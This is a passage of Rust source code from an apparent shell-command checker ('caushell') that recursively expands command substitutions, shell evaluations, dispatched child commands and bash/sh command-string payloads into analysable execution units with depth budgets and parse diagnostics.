        || entry.depth >= max_depth
        || entry.origin_kind == ExecutionUnitOriginKind::Dispatch
    {
        return;
    }
    let Some(command) = entry
        .parsed_scope
        .commands
        .get(entry.command_ref.command_index)
    else {
        return;
    };
    if !command
        .tokens
        .iter()
        .any(|t| !t.runtime_data && !t.command_substitutions.is_empty())
    {
        return;
    }
    let name = match &entry.result {
        ResolveInvocationArtifactResult::Resolved(r) => &r.normalized_command_name,
        ResolveInvocationArtifactResult::SelectionError {
            normalized_command_name,
            ..
        } => normalized_command_name,
        _ => return,
    };
    // A module namespace is not a bare executable namespace. Do not rebind a
    // module result through the executable registry to attach an argv proof.
    let Some(command_name) = command.command_name.as_deref() else {
        return;
    };
    if registry.lookup(command_name).normalized_command_name != *name {
        return;
    }
    let mut aliases = inherited_aliases.clone();
    for scoped_command in &entry.parsed_scope.commands {
        for assignment in crate::support::alias_assignments(scoped_command) {
            aliases.insert(
                assignment.name.clone(),
                SessionAliasBinding::new(assignment.name, assignment.body, request.sequence_no),
            );
        }
    }
    let proofs = crate::support::substitution_shapes(
        registry,
        command,
        entry.shell_kind,
        &entry.bindings,
        &aliases,
        max_depth - entry.depth,
    );
    if !proofs.is_empty() {
        entry.result = caushell_profile::resolve_invocation_artifact_with_stdout_proofs(
            registry,
            command,
            runtime_context_for_parsed_command(
                &entry.parsed_scope,
                entry.command_ref.command_index,
                command,
            ),
            &entry.bindings,
            &proofs,
        );
    }
}

fn nested_payload_history_anchor_node_id(
    request: &CheckRequest,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
    record: &NestedPayloadRecord,
) -> caushell_graph::NodeId {
    if let NestedPayloadParentRef::RootCommand { command_index } = record.parent_ref
        && let Some(command) = parsed_request.commands.get(command_index)
    {
        return source_node_id_for_command(request, parsed_request, command_index, command);
    }

    if let Some(command) = parsed_request.commands.get(record.root_command_index) {
        return source_node_id_for_command(
            request,
            parsed_request,
            record.root_command_index,
            command,
        );
    }

    match &record.parent_ref {
        NestedPayloadParentRef::RootCommand { command_index } => {
            caushell_runner::top_level_command_node_id(request, *command_index)
        }
        NestedPayloadParentRef::DerivedInvocation { node_id } => node_id.clone(),
    }
}

/// Stable assignment-bearing event ordinals: standalone assignments first,
/// then declarations, then executable prefix assignments. The locator stores
/// all value metadata; this ordinal is identity, not a lookup into one AST Vec.
fn assignment_substitution_groups(
    parsed: &caushell_parse::ParsedCommandArtifact,
) -> impl Iterator<
    Item = (
        &caushell_parse::SourceSpan,
        &caushell_parse::SourceSpan,
        &[caushell_parse::VariableAssignmentFact],
    ),
> {
    parsed
        .assignment_commands
        .iter()
        .map(|c| (&c.top_level_span, &c.span, c.assignments.as_slice()))
        .chain(
            parsed
                .declaration_commands
                .iter()
                .map(|c| (&c.top_level_span, &c.span, c.assignments.as_slice())),
        )
        .chain(
            parsed
                .commands
                .iter()
                .map(|c| (&c.top_level_span, &c.span, c.prefix_assignments.as_slice())),
        )
}

/// Retain an explicit unresolved execution unit when a substitution body
/// cannot be parsed completely. A parser budget/error is never empty output.
/// Known partial commands are preserved; the extra unit has no invented name.
fn execution_body_scope(
    text: &str,
    shell_kind: caushell_types::ShellKind,
    depth_exhausted: bool,
    source_label: &str,
) -> (caushell_parse::ParsedCommandArtifact, Option<usize>) {
    use caushell_parse::{
        CommandFact, DiagnosticKind, ParseDiagnostic, ParseStatus, ParsedCommandArtifact,
        SourceSpan,
    };
    let end_row = text.bytes().filter(|&b| b == b'\n').count();
    let span = SourceSpan {
        start_byte: 0,
        end_byte: text.len(),
        start_row: 0,
        start_column: 0,
        end_row,
        end_column: text.rfind('\n').map_or(text.len(), |i| text.len() - i - 1),
    };
    // A statically empty payload cannot contain a pending invocation. Parsing
    // it creates no deeper execution scope at an expansion boundary.
    let parsed = (!depth_exhausted || text.trim().is_empty())
        .then(|| caushell_parse::parse_command(text, shell_kind));
    let (mut parsed, error) = match parsed {
        Some(Ok(parsed)) if parsed.status == ParseStatus::Complete => return (parsed, None),
        Some(Ok(parsed)) => (
            parsed,
            format!("{source_label} contains unresolved shell syntax"),
        ),
        error => (
            ParsedCommandArtifact {
                raw_command: text.into(),
                shell_kind,
                status: ParseStatus::Partial,
                commands: Vec::new(),
                declaration_commands: Vec::new(),
                assignment_commands: Vec::new(),
                for_loops: Vec::new(),
                unset_commands: Vec::new(),
                shell_evaluations: Vec::new(),
                function_definitions: Vec::new(),
                redirections: Vec::new(),
                diagnostics: Vec::new(),
                status_conditions: Vec::new(),
            },
            match error {
                Some(Err(error)) => {
                    format!("{source_label} could not be parsed: {error}")
                }
                None => format!("{source_label} exceeds execution expansion depth budget"),
                Some(Ok(_)) => unreachable!(),
            },
        ),
    };
    parsed.diagnostics.push(ParseDiagnostic {
        kind: DiagnosticKind::ErrorNode,
        node_kind: "execution_body".into(),
        text: error,
        span: span.clone(),
    });
    let unknown_index = parsed.commands.len();
    parsed.commands.push(CommandFact {
        command_name: None,
        command_name_runtime_data: false,
        text: text.into(),
        prefix_assignments: Vec::new(),
        tokens: Vec::new(),
        in_pipeline: false,
        pipeline_position: None,
        pipeline_span: None,
        terminator: None,
        guarded: false,
        conditional_execution: false,
        shell_scope_span: None,
        subshell_span: None,
        control_flow_span: None,
        top_level_span: span.clone(),
        span,
    });
    (parsed, Some(unknown_index))
}

#[derive(Clone, Copy)]
enum AssignmentCwdSource<'a> {
    Request,
    RecordScope(&'a caushell_graph::NodeId),
    InvocationEntry,
    Fixed(&'a caushell_runner::ShellSourceCwdAnchor),
}

impl AssignmentCwdSource<'_> {
    fn at(self, start_byte: usize) -> caushell_runner::ShellSourceCwdAnchor {
        use caushell_runner::ShellSourceCwdAnchor;
        match self {
            Self::Request => ShellSourceCwdAnchor::RequestPosition { start_byte },
            Self::RecordScope(source_node_id) => ShellSourceCwdAnchor::RecordScopePosition {
                source_node_id: source_node_id.clone(),
                start_byte,
            },
            Self::InvocationEntry => ShellSourceCwdAnchor::InvocationEntry,
            Self::Fixed(anchor) => anchor.clone(),
        }
    }
}

fn expanded_assignment_command_substitution_body_roots(
    syntax_scopes: &mut Vec<caushell_runner::ShellRedirectionScope>,
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
    max_nested_parse_depth: u8,
) -> Vec<ExpandedFrontierEntry> {
    let mut children = Vec::new();

    for (assignment_command_index, (top_level_span, span, assignments)) in
        assignment_substitution_groups(parsed_request).enumerate()
    {
        if !assignments
            .iter()
            .any(|a| !a.value.command_substitutions.is_empty())
        {
            continue;
        }
        let Some(parent_unit) = top_level_unit_for_span(parsed_request, top_level_span) else {
            continue;
        };
        let parent_execution_node_id = parent_unit.node_id(request);
        let base_bindings = runtime_visible_variable_bindings_before_span(
            registry,
            session.summary(),
            request,
            parsed_request,
            span.start_byte,
            request.sequence_no,
        );

        children.extend(
            expanded_assignment_command_substitution_body_children_for_scope(
                syntax_scopes,
                registry,
                request,
                parsed_request,
                request.shell_kind,
                &parent_execution_node_id,
                &parent_execution_node_id,
                parent_unit.unit_index,
                1,
                &base_bindings,
                &ExecutionUnitInheritedScope::default(),
                Some(assignment_command_index),
                None,
                AssignmentCwdSource::Request,
                max_nested_parse_depth,
            ),
        );
    }

    for (site_index, site) in parsed_request.shell_evaluations.iter().enumerate() {
        let Some(parent_unit) = top_level_unit_for_span(parsed_request, &site.top_level_span)
        else {
            continue;
        };
        let parent = parent_unit.node_id(request);
        let bindings = runtime_visible_variable_bindings_before_span(
            registry,
            session.summary(),
            request,
            parsed_request,
            0,
            request.sequence_no,
        );
        children.extend(expanded_shell_evaluation_children(
            syntax_scopes,
            registry,
            request,
            parsed_request,
            request.shell_kind,
            &parent,
            &parent,
            parent_unit.unit_index,
            1,
            &bindings,
            &ExecutionUnitInheritedScope::default(),
            Some(site_index),
            AssignmentCwdSource::Request,
            None,
            max_nested_parse_depth,
        ));
    }
    children
}

fn expanded_assignment_command_substitution_body_children_for_scope(
    syntax_scopes: &mut Vec<caushell_runner::ShellRedirectionScope>,
    registry: &ProfileRegistry,
    request: &CheckRequest,
    parsed_scope: &caushell_parse::ParsedCommandArtifact,
    shell_kind: caushell_types::ShellKind,
    parent_execution_node_id: &caushell_graph::NodeId,
    history_anchor_node_id: &caushell_graph::NodeId,
    root_command_index: usize,
    depth: u8,
    base_bindings: &SessionBindings,
    inherited_scope: &ExecutionUnitInheritedScope,
    only_assignment_command_index: Option<usize>,
    source_suffix_prefix: Option<&str>,
    cwd_source: AssignmentCwdSource<'_>,
    max_nested_parse_depth: u8,
) -> Vec<ExpandedFrontierEntry> {
    let mut children = Vec::new();

    for (assignment_command_index, (_, span, assignments)) in
        assignment_substitution_groups(parsed_scope).enumerate()
    {
        if only_assignment_command_index.is_some_and(|target| target != assignment_command_index) {
            continue;
        }
        if !assignments
            .iter()
            .any(|a| !a.value.command_substitutions.is_empty())
        {
            continue;
        }

        let assignment_bindings = apply_runtime_variable_bindings_before_span(
            registry,
            request,
            base_bindings.clone(),
            parsed_scope,
            span.start_byte,
            request.sequence_no,
        );
        let source_cwd_anchor = cwd_source.at(span.start_byte);

        for (assignment_index, assignment) in assignments.iter().enumerate() {
            for (substitution_index, substitution) in
                assignment.value.command_substitutions.iter().enumerate()
            {
                let (parsed_substitution, unknown_index) = execution_body_scope(
                    &substitution.body_text,
                    shell_kind,
                    depth > max_nested_parse_depth,
                    "command substitution body",
                );

                if parsed_substitution.commands.is_empty() {
                    register_shell_redirection_scope(
                        registry,
                        request,
                        syntax_scopes,
                        &parsed_substitution,
                        &assignment_bindings,
                        parent_execution_node_id.clone(),
                        None,
                        ExecutionUnitOriginKind::CommandSubstitutionBody,
                        ExecutionUnitOriginLocator::CommandSubstitutionAssignmentValue {
                            assignment_scope_key: source_suffix_prefix.map(str::to_string),
                            source_cwd_anchor: source_cwd_anchor.clone(),
                            assignment_command_index,
                            assignment_index,
                            substitution_index,
                            assignment_name: assignment.name.clone(),
                            assignment_value_text: assignment.value.text.clone(),
                            substitution_text: substitution.text.clone(),
                            substitution_body_text: substitution.body_text.clone(),
                        },
                        depth,
                        root_command_index,
                        false,
                        max_nested_parse_depth,
                    );
                }
                let scope_records_start = children.len();
                for (command_index, child_command) in
                    parsed_substitution.commands.iter().enumerate()
                {
                    let assignment_suffix = format!(
                        "{assignment_command_index}:{assignment_index}:{substitution_index}:{command_index}"
                    );
                    let source_suffix = source_suffix_prefix
                        .map(|prefix| format!("{prefix}:{assignment_suffix}"))
                        .unwrap_or(assignment_suffix);
                    let command_bindings = apply_runtime_variable_bindings_before_span(
                        registry,
                        request,
                        assignment_bindings.clone(),
                        &parsed_substitution,
                        child_command.span.start_byte,
                        request.sequence_no,
                    );
                    children.push(ExpandedFrontierEntry {
                        source_node_id: expanded_virtual_node_id_with_suffix(
                            "subst-assign",
                            parent_execution_node_id,
                            &source_suffix,
                        ),
                        command_ref: ParsedCommandRef::new(
                            command_index,
                            child_command.span.clone(),
                        ),
                        parsed_scope: parsed_substitution.clone(),
                        rendered_command_text: child_command.text.clone(),
                        result: if unknown_index == Some(command_index) {
                            ResolveInvocationArtifactResult::MissingCommandName {
                                gap_kind: caushell_types::ResolveGapKind::OpaqueInvocation,
                            }
                        } else {
                            resolve_invocation_artifact_with_bindings(
                                registry,
                                child_command,
                                runtime_context_for_parsed_command(
                                    &parsed_substitution,
                                    command_index,
                                    child_command,
                                ),
                                &command_bindings,
                            )
                        },
                        shell_kind,
                        root_command_index,
                        depth,
                        parent_execution_node_id: parent_execution_node_id.clone(),
                        bindings: command_bindings.clone(),
                        static_payload_scope: StaticPayloadLookupScope {
                            parsed_scope: parsed_substitution.clone(),
                            command_index,
                            bindings: command_bindings,
                            scope_base_bindings: assignment_bindings.clone(),
                            stdin_is_parent_output: false,
                        },
                        history_anchor_node_id: history_anchor_node_id.clone(),
                        origin_kind: ExecutionUnitOriginKind::CommandSubstitutionBody,
                        origin_index: command_index,
                        origin_locator:
                            ExecutionUnitOriginLocator::CommandSubstitutionAssignmentValue {
                                assignment_scope_key: source_suffix_prefix.map(str::to_string),
                                source_cwd_anchor: source_cwd_anchor.clone(),
                                assignment_command_index,
                                assignment_index,
                                substitution_index,
                                assignment_name: assignment.name.clone(),
                                assignment_value_text: assignment.value.text.clone(),
                                substitution_text: substitution.text.clone(),
                                substitution_body_text: substitution.body_text.clone(),
                            },
                        inherited_scope: inherited_scope.clone(),
                    });
                }
                if depth <= max_nested_parse_depth {
                    let scope_record_node_id = children
                        .get(scope_records_start)
                        .filter(|_| !parsed_substitution.commands.is_empty())
                        .map(|e| e.source_node_id.clone());
                    children.extend(expanded_assignment_command_substitution_body_children_for_scope(syntax_scopes,
                        registry, request, &parsed_substitution, shell_kind,
                        parent_execution_node_id, history_anchor_node_id, root_command_index,
                        depth.saturating_add(1), &assignment_bindings, inherited_scope, None,
                        Some(&format!("{}:nested:{assignment_command_index}:{assignment_index}:{substitution_index}", source_suffix_prefix.unwrap_or("subst-assign"))),
                        scope_record_node_id.as_ref().map(AssignmentCwdSource::RecordScope)
                            .unwrap_or(AssignmentCwdSource::Fixed(&source_cwd_anchor)),
                        max_nested_parse_depth,
                    ));
                }
            }
        }
    }

    if only_assignment_command_index.is_none() {
        children.extend(expanded_shell_evaluation_children(
            syntax_scopes,
            registry,
            request,
            parsed_scope,
            shell_kind,
            parent_execution_node_id,
            history_anchor_node_id,
            root_command_index,
            depth,
            base_bindings,
            inherited_scope,
            None,
            cwd_source,
            source_suffix_prefix,
            max_nested_parse_depth,
        ));
    }
    children
}

#[allow(clippy::too_many_arguments)]
fn expanded_shell_evaluation_children(
    syntax_scopes: &mut Vec<caushell_runner::ShellRedirectionScope>,
    registry: &ProfileRegistry,
    request: &CheckRequest,
    parsed: &caushell_parse::ParsedCommandArtifact,
    shell_kind: caushell_types::ShellKind,
    parent: &caushell_graph::NodeId,
    history_anchor: &caushell_graph::NodeId,
    root_index: usize,
    depth: u8,
    base_bindings: &SessionBindings,
    inherited_scope: &ExecutionUnitInheritedScope,
    only_site: Option<usize>,
    cwd_source: AssignmentCwdSource<'_>,
    namespace: Option<&str>,
    max_depth: u8,
) -> Vec<ExpandedFrontierEntry> {
    let mut children = Vec::new();
    for (site_index, site) in parsed.shell_evaluations.iter().enumerate() {
        if only_site.is_some_and(|i| i != site_index) {
            continue;
        }
        let evaluation_start = match site.kind {
            caushell_parse::ShellEvaluationKind::RedirectionExpansion {
                redirection_index, ..
            } => {
                let redirect = &parsed.redirections[redirection_index];
                redirect
                    .opening_statement
                    .as_ref()
                    .map(|s| &s.span)
                    .or(redirect.parent_command_span.as_ref())
                    .unwrap_or(&redirect.top_level_span)
                    .start_byte
            }
            _ => site.input.span.start_byte,
        };
        let bindings = apply_runtime_variable_bindings_before_span(
            registry,
            request,
            base_bindings.clone(),
            parsed,
            evaluation_start,
            request.sequence_no,
        );
        let mut evaluation = crate::support::shell_evaluation::evaluate(
            registry,
            request,
            parsed,
            site,
            &bindings,
            base_bindings,
            max_depth.saturating_sub(depth),
        );
        // Token/assignment substitutions already have their canonical producer.
        // Unset operands are syntax-only facts, so their first expansion is ours.
        if !matches!(
            site.kind,
            caushell_parse::ShellEvaluationKind::UnsetOperand { .. }
                | caushell_parse::ShellEvaluationKind::RedirectionExpansion { .. }
                | caushell_parse::ShellEvaluationKind::ForListExpansion
        ) {
            for direct in &site.input.command_substitutions {
                let owned = parsed
                    .commands
                    .iter()
                    .flat_map(|c| &c.tokens)
                    .flat_map(|t| &t.command_substitutions)
                    .any(|s| s.span == direct.span)
                    || assignment_substitution_groups(parsed)
                        .flat_map(|(_, _, assignments)| assignments)
                        .flat_map(|a| &a.value.command_substitutions)
                        .any(|s| s.span == direct.span)
                    || parsed
                        .redirections
                        .iter()
                        .flat_map(|r| r.target.iter().chain(r.content.iter()))
                        .flat_map(|v| &v.command_substitutions)
                        .any(|s| s.span == direct.span)
                    || parsed
                        .for_loops
                        .iter()
                        .flat_map(|iteration| iteration.items.iter().flatten())
                        .flat_map(|item| &item.command_substitutions)
                        .any(|s| s.span == direct.span);
                if owned
                    && let Some(index) = evaluation
                        .programs
                        .iter()
                        .position(|body| body == &direct.body_text)
                {
                    evaluation.programs.remove(index);
                }
            }
        }
        let program_count = evaluation.programs.len();
        if evaluation.unresolved {
            evaluation.programs.push(site.input.text.clone());
        }
        let anchor = cwd_source.at(
            if matches!(
                site.kind,
                caushell_parse::ShellEvaluationKind::RedirectionExpansion { .. }
                    | caushell_parse::ShellEvaluationKind::ForListExpansion
            ) {
                evaluation_start
            } else {
                site.top_level_span.start_byte
            },
        );
        for (substitution_index, body) in evaluation.programs.iter().enumerate() {
            let unresolved = substitution_index == program_count;
            let (mut scope, unknown_index) = execution_body_scope(
                body,
                shell_kind,
                unresolved || depth > max_depth,
                match site.kind {
                    caushell_parse::ShellEvaluationKind::RedirectionExpansion { .. } => {
                        "redirection command substitution"
                    }
                    caushell_parse::ShellEvaluationKind::ForListExpansion => {
                        "for-list command substitution"
                    }
                    _ => "shell arithmetic/index evaluation",
                },
            );
            if unresolved {
                for diagnostic in &mut scope.diagnostics {
                    diagnostic.text = if matches!(
                        site.kind,
                        caushell_parse::ShellEvaluationKind::RedirectionExpansion { .. }
                    ) {
                        "redirection expansion is unresolved".into()
                    } else {
                        "shell arithmetic/index expression is unresolved".into()
                    };
                }
            }
            let locator = ExecutionUnitOriginLocator::ShellEvaluation {
                scope_key: namespace.map(str::to_owned),
                source_cwd_anchor: anchor.clone(),
                source_start_byte: site.input.span.start_byte,
                site_index,
                substitution_index,
                expression: site.input.text.clone(),
                substitution_body: (!unresolved).then(|| body.clone()),
                redirection_source: match site.kind {
                    caushell_parse::ShellEvaluationKind::RedirectionExpansion {
                        redirection_index,
                        ..
                    } => Some((anchor.clone(), redirection_index)),
                    _ => None,
                },
            };
            if scope.commands.is_empty() {
                register_shell_redirection_scope(
                    registry,
                    request,
                    syntax_scopes,
                    &scope,
                    &bindings,
                    parent.clone(),
                    None,
                    ExecutionUnitOriginKind::CommandSubstitutionBody,
                    locator.clone(),
                    depth,
                    root_index,
                    false,
                    max_depth,
                );
            }
            let start = children.len();
            for (command_index, command) in scope.commands.iter().enumerate() {
                let command_bindings = apply_runtime_variable_bindings_before_span(
                    registry,
                    request,
                    bindings.clone(),
                    &scope,
                    command.span.start_byte,
                    request.sequence_no,
                );
                children.push(ExpandedFrontierEntry {
                    source_node_id: expanded_virtual_node_id_with_suffix(
                        "shell-eval",
                        parent,
                        &format!(
                            "{}:{site_index}:{substitution_index}:{command_index}",
                            namespace.unwrap_or("root")
                        ),
                    ),
                    command_ref: ParsedCommandRef::new(command_index, command.span.clone()),
                    parsed_scope: scope.clone(),
                    rendered_command_text: command.text.clone(),
                    result: if unknown_index == Some(command_index) {
                        ResolveInvocationArtifactResult::MissingCommandName {
                            gap_kind: caushell_types::ResolveGapKind::OpaqueInvocation,
                        }
                    } else {
                        resolve_invocation_artifact_with_bindings(
                            registry,
                            command,
                            runtime_context_for_parsed_command(&scope, command_index, command),
                            &command_bindings,
                        )
                    },
                    shell_kind,
                    root_command_index: root_index,
                    depth,
                    parent_execution_node_id: parent.clone(),
                    bindings: command_bindings.clone(),
                    static_payload_scope: StaticPayloadLookupScope {
                        parsed_scope: scope.clone(),
                        command_index,
                        bindings: command_bindings,
                        scope_base_bindings: bindings.clone(),
                        stdin_is_parent_output: false,
                    },
                    history_anchor_node_id: history_anchor.clone(),
                    origin_kind: ExecutionUnitOriginKind::CommandSubstitutionBody,
                    origin_index: command_index,
                    origin_locator: locator.clone(),
                    inherited_scope: inherited_scope.clone(),
                });
            }
            if depth <= max_depth && !unresolved {
                let representative = children.get(start).map(|e| e.source_node_id.clone());
                children.extend(
                    expanded_assignment_command_substitution_body_children_for_scope(
                        syntax_scopes,
                        registry,
                        request,
                        &scope,
                        shell_kind,
                        parent,
                        history_anchor,
                        root_index,
                        depth.saturating_add(1),
                        &bindings,
                        inherited_scope,
                        None,
                        Some(&format!(
                            "{}:eval:{site_index}:{substitution_index}",
                            namespace.unwrap_or("root")
                        )),
                        representative
                            .as_ref()
                            .map(AssignmentCwdSource::RecordScope)
                            .unwrap_or(AssignmentCwdSource::Fixed(&anchor)),
                        max_depth,
                    ),
                );
            }
        }
    }
    children
}

fn expanded_dispatch_children(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    resolved: &caushell_profile::ResolvedInvocationArtifact,
) -> Vec<ExpandedFrontierEntry> {
    if should_skip_generic_dispatch_projection(resolved) {
        return Vec::new();
    }

    let mut children = Vec::new();
    let inherited_scope = inherited_scope_for_dispatch(
        resolved,
        &entry.inherited_scope,
        request.shell_state_before.cwd(),
        request.home.as_deref(),
    );

    for child in dispatch_projection_for_resolved(
        registry,
        resolved,
        request.shell_state_before.cwd(),
        request.home.as_deref(),
    )
    .resolved
    {
        let mut child_inherited_scope = inherited_scope.clone();
        let inherits_cwd = matches!(
            child.working_directory,
            caushell_profile::DispatchWorkingDirectory::Inherit
        );
        child_inherited_scope.static_input_cwd_unproven |= !inherits_cwd;
        child_inherited_scope.dispatch_working_directory =
            (!inherits_cwd).then(|| child.working_directory.clone());
        child_inherited_scope.dispatch_stdout_to_parent = child.stdout_to_parent;
        if child.stdin_from_parent || child.stdin_from_tool {
            child_inherited_scope.native_stdin_route = None;
        }
        let command = materialized_dispatch_child_command_fact(resolved, &child);
        let parent_bindings = crate::support::command_environment_bindings(
            &entry.bindings,
            &entry.parsed_scope,
            &entry.command_ref,
        );
        let child_bindings = dispatch_child_session_bindings(&parent_bindings, &child, &command);
        let Some((parsed_scope, command)) = parsed_dispatch_scope(command, entry.shell_kind) else {
            continue;
        };
        let stdin_available = child.stdin_from_parent
            || child.stdin_from_tool
            || resolved.projection.stdin_payload_available;
        let resolved_child =
            caushell_profile::resolve_invocation_in_lookup_domain_with_stdout_proofs(
                registry,
                &command,
                InvocationRuntimeContext {
                    shell_kind: entry.shell_kind,
                    stdin_payload_available: stdin_available,
                    interactive_session: false,
                },
                &child_bindings,
                &child.lookup_domain,
                &forwarded_substitution_shapes(resolved, &command),
            )
            .into_artifact();
        let source_node_id = if entry.origin_kind == ExecutionUnitOriginKind::TopLevel {
            dispatch_derived_invocation_node_id(
                &request.session_id,
                request.sequence_no,
                entry.command_ref.command_index,
                child.dispatch_index,
            )
        } else {
            expanded_virtual_node_id("dispatch", &entry.source_node_id, child.dispatch_index)
        };
        child_inherited_scope.native_argument_inputs =
            crate::support::forwarded_native_argument_inputs(
                &entry.inherited_scope,
                &entry.source_node_id,
                &source_node_id,
                &command,
            );
        let mut static_payload_scope = entry.static_payload_scope.clone();
        static_payload_scope.bindings = child_bindings.clone();
        static_payload_scope.stdin_is_parent_output |= child.stdin_from_parent;
        if child.stdin_from_tool {
            // Tool-produced bytes are not the caller's stdin or prior pipeline
            // output. An interpreter must retain runtime-input uncertainty.
            static_payload_scope.parsed_scope = parsed_scope.clone();
            static_payload_scope.command_index = 0;
            static_payload_scope.stdin_is_parent_output = false;
        }
        children.push(ExpandedFrontierEntry {
            source_node_id,
            command_ref: ParsedCommandRef::new(child.dispatch_index, command.span.clone()),
            parsed_scope,
            rendered_command_text: command.text.clone(),
            result: resolved_child,
            shell_kind: entry.shell_kind,
            root_command_index: entry.root_command_index,
            depth: entry.depth.saturating_add(1),
            parent_execution_node_id: entry.source_node_id.clone(),
            bindings: child_bindings,
            static_payload_scope,
            history_anchor_node_id: entry.history_anchor_node_id.clone(),
            origin_kind: ExecutionUnitOriginKind::Dispatch,
            origin_index: child.dispatch_index,
            origin_locator: if child.stdin_from_parent {
                ExecutionUnitOriginLocator::DispatchStdinFromParent
            } else if stdin_available {
                ExecutionUnitOriginLocator::DispatchInheritedStdin
            } else {
                ExecutionUnitOriginLocator::None
            },
            inherited_scope: child_inherited_scope,
        });
    }

    children
}

fn expanded_shell_payload_children(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    max_nested_parse_depth: u8,
    syntax_scopes: &mut Vec<caushell_runner::ShellRedirectionScope>,
) -> Vec<ExpandedFrontierEntry> {
    let shell_kind = match resolved.normalized_command_name.as_str() {
        "bash" => caushell_types::ShellKind::Bash,
        "sh" => caushell_types::ShellKind::Sh,
        _ => return Vec::new(),
    };
    let parent_bindings = crate::support::command_environment_bindings(
        &entry.bindings,
        &entry.parsed_scope,
        &entry.command_ref,
    );
    let Some((shell_payload, payload_span, positional_args)) =
        shell_payload_from_bound_invocation(resolved, &parent_bindings)
    else {
        return Vec::new();
    };
    let (mut parsed_payload, mut unknown_index) = execution_body_scope(
        &shell_payload,
        shell_kind,
        entry.depth.saturating_add(1) > max_nested_parse_depth,
        "shell command-string payload",
    );
    if let Some(origin) = entry
        .inherited_scope
        .native_template_input
        .as_ref()
        .filter(|origin| origin.symbolic_parameters && origin.source_text == shell_payload)
        && !crate::support::bind_symbolic_template_inputs(
            &mut parsed_payload,
            &positional_args,
            origin,
        )
    {
        (parsed_payload, unknown_index) = execution_body_scope(
            &shell_payload,
            shell_kind,
            true,
            "native template parameter frame",
        );
    }
    bind_shell_positional_arguments(&mut parsed_payload, &positional_args);
    let shell_bindings = shell_payload_session_bindings(&parent_bindings, &positional_args);
    let mut payload_scope = entry.inherited_scope.clone();
    // A shell program can persistently replace descriptors (including through
    // functions/eval). Its descriptor-state proof is separate; do not carry a
    // native launcher's null route into arbitrary script events.
    payload_scope.native_stdin_route = None;
    payload_scope.native_template_input = payload_scope
        .native_template_input
        .filter(|input| input.source_text == shell_payload);
    payload_scope.native_argument_inputs.clear();
    let payload_inputs: Vec<_> = entry
        .inherited_scope
        .native_argument_inputs
        .iter()
        .filter(|input| input.consumer_node_id == entry.source_node_id)
        .filter_map(|input| {
            let projection = crate::support::native_shell_payload_projection(
                &input.projections,
                &payload_span,
                &shell_payload,
                shell_kind,
            )?;
            let mut origin = input.origin.as_ref().clone();
            origin.data_ranges = projection.data_ranges.clone();
            Some(std::sync::Arc::new(origin))
        })
        .collect();
    payload_scope.native_stdin_route_unproven |=
        !payload_inputs.is_empty() && execution_unit_inherits_stdin(entry);
    if parsed_payload.commands.is_empty() {
        register_shell_redirection_scope(
            registry,
            request,
            syntax_scopes,
            &parsed_payload,
            &shell_bindings,
            entry.source_node_id.clone(),
            None,
            ExecutionUnitOriginKind::ShellCommandStringPayload,
            ExecutionUnitOriginLocator::None,
            entry.depth.saturating_add(1),
            entry.root_command_index,
            false,
            max_nested_parse_depth,
        );
    }

    let mut children: Vec<ExpandedFrontierEntry> = parsed_payload
        .commands
        .iter()
        .enumerate()
        .map(|(command_index, command)| {
            let source_node_id =
                expanded_virtual_node_id("shell-payload", &entry.source_node_id, command_index);
            let mut inherited_scope = payload_scope.clone();
            inherited_scope.native_argument_inputs = payload_inputs
                .iter()
                .map(|origin| caushell_runner::NativeArgumentInput {
                    consumer_node_id: source_node_id.clone(),
                    origin: origin.clone(),
                    projections: Vec::new(),
                })
                .collect();
            let command_bindings = apply_runtime_variable_bindings_before_span(
                registry,
                request,
                shell_bindings.clone(),
                &parsed_payload,
                command.span.start_byte,
                request.sequence_no,
            );
            ExpandedFrontierEntry {
                source_node_id,
                command_ref: ParsedCommandRef::new(command_index, command.span.clone()),
                parsed_scope: parsed_payload.clone(),
                rendered_command_text: command.text.clone(),
                result: if unknown_index == Some(command_index) {
                    ResolveInvocationArtifactResult::MissingCommandName {
                        gap_kind: caushell_types::ResolveGapKind::OpaqueInvocation,
                    }
                } else {
                    resolve_invocation_artifact_with_bindings(
                        registry,
                        command,
                        InvocationRuntimeContext {
                            shell_kind,
                            stdin_payload_available: resolved.projection.stdin_payload_available
                                || runtime_context_for_parsed_command(
                                    &parsed_payload,
                                    command_index,
                                    command,
                                )
                                .stdin_payload_available,
                            interactive_session: false,
                        },
                        &command_bindings,
                    )
                },
                shell_kind,
                root_command_index: entry.root_command_index,
                depth: entry.depth.saturating_add(1),
                parent_execution_node_id: entry.source_node_id.clone(),
                bindings: command_bindings.clone(),
                static_payload_scope: StaticPayloadLookupScope {
                    parsed_scope: parsed_payload.clone(),
                    command_index,
                    bindings: command_bindings,
                    scope_base_bindings: shell_bindings.clone(),
                    stdin_is_parent_output: false,
                },
                history_anchor_node_id: entry.history_anchor_node_id.clone(),
                origin_kind: ExecutionUnitOriginKind::ShellCommandStringPayload,
                origin_index: command_index,
                origin_locator: ExecutionUnitOriginLocator::None,
                inherited_scope,
            }
        })
        .collect();

    children.extend(
        expanded_assignment_command_substitution_body_children_for_scope(
            syntax_scopes,
            registry,
            request,
            &parsed_payload,
            shell_kind,
            &entry.source_node_id,
            &entry.history_anchor_node_id,
            entry.root_command_index,
            entry.depth.saturating_add(2),
            &shell_bindings,
            &payload_scope,
            None,
            Some("shell-payload"),
            children
                .first()
                .map(|child| AssignmentCwdSource::RecordScope(&child.source_node_id))
                .unwrap_or(AssignmentCwdSource::InvocationEntry),
            max_nested_parse_depth,
        ),
    );

    children
}

fn expanded_recursive_payload_children(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    source_context: &ProgramSourceContext,
    legacy_payload_covered: bool,
    max_nested_parse_depth: u8,
    first_payload_id: usize,
    unresolved_payloads: &mut Vec<NestedPayloadRecord>,
    syntax_scopes: &mut Vec<caushell_runner::ShellRedirectionScope>,
) -> Vec<ExpandedFrontierEntry> {
    if legacy_payload_covered {
        return Vec::new();
    }

    let script_file_candidates = script_file_payload_candidates_from_literal_writes(
        registry,
        session,
        request,
        resolved,
        &entry.bindings,
        &entry.parsed_scope,
